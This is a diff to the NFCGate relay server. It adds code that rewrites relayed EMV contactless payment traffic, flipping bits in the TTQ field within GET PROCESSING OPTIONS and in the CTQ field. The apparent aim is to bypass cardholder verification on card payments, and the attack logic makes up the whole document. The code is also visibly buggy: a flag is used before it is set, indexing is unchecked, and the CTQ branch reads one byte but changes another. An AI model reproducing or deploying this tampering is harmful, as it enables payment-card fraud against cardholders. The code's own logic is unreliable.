@@ -61,9 +61,33 @@ class NFCGateClientHandler(socketserver.StreamRequestHandler):
                 # update and add association
                 self.session = session
                 self.server.add_client(self, session)
-
+                
+            #print('[{}]'.format(', '.join(hex(x) for x in data)))
+            data2 = [int(x) for x in data] # copy of data
+            
+            for x in range(0,len(data)):
+                if(data[x] == 0x9F and data[x+1]==0x66):            #TTQ  - (byte 2, bit 7)
+                    print("!! TTQ detected")
+                    ttq = True                                      #It will check GET PROCESSING
+                    break
+                
+                if(ttq and data[x]==0x80 and data[x+1]==0xa8):      #TTQ  - (byte 2, bit 7) in GET PROCESSING
+                    print("!! Modifing GET PROCESSING if necessary")
+                    ttq = False
+                    if(data[x+8] & (1<<(7-1))):                     # Modify bit 7 in byte 2 to "0" if it is "1"
+                        data2[x+8] = int(bin(data[x+8] ^ (1<<6)),2)
+                        break
+                        
+                if(data[x] == 0x9f and data[x+1] == 0x6c):          #CTQ - (byte 2, bit 8)
+                    if(not data[x+8] & (1<<(8-1))):                 # if bit 8 in byte 2 is not 1, flip it to "0"
+                        data2[x+4] = int(bin(data[x+4] ^ (1<<7)),2)
+                        break
+            #print('[{}]'.format(', '.join(hex(x) for x in data2)))
+            
+            data3 = bytes(data2)
+            
             # allow plugins to filter data before sending it to all clients in the session
-            self.server.send_to_clients(self.session, self.server.plugins.filter(self.log, data), self)
+            self.server.send_to_clients(self.session, self.server.plugins.filter(self.log, data3), self)
 
     def finish(self):
         super().finish()
